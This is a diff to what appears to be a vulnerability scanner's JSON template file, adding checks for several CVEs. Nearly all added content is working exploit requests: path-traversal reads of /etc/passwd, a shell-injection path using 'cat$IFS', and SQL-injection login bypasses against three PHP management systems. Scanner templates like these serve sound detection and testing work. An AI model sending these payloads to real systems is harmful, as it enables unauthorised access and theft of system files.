@@ -3916,6 +3916,21 @@
       ]
     },
     {
+      "id": "CVE-2015-4074",
+      "info": {
+        "name": "Joomla Helpdesk Pro plugin before 1.4.0 - Local File Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?option=com_helpdeskpro&task=ticket.download_attachment&filename=/../../../../../../../../../../../../etc/passwd&original_filename=AnyFileName.exe"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-4127",
       "info": {
         "name": "WordPress Plugin church_admin - Cross-Site Scripting (XSS)",
@@ -4949,6 +4964,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/cgi-bin/;cat$IFS/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-6601",
+      "info": {
+        "name": "ZOHO WebNMS Framework 5.2 and 5.2 SP1 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/servlets/FetchFile?fileName=../../../etc/passwd"
           ]
         }
       ]
@@ -20264,6 +20294,51 @@
           "path": [
             "{{BaseURL}}/category_view.php",
             "{{BaseURL}}/folder_view.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29006",
+      "info": {
+        "name": "Directory Management System  1.0 - SQLi Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nusername=admin' or '1'='1&password=1&login=login\n",
+            "GET /admin/dashboard.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29007",
+      "info": {
+        "name": "Dairy Farm Shop Management System v1.0 - SQLi Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /dfsms/index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nusername=admin' or '1'='1&password=1&login=login\n",
+            "GET /dfsms/add-category.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29009",
+      "info": {
+        "name": "Cyber Cafe Management System Project v1.0 - SQLi Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /ccms/index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nusername=%27+Or+1--+-&password=1&login=\n",
+            "GET /ccms/dashboard.php HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
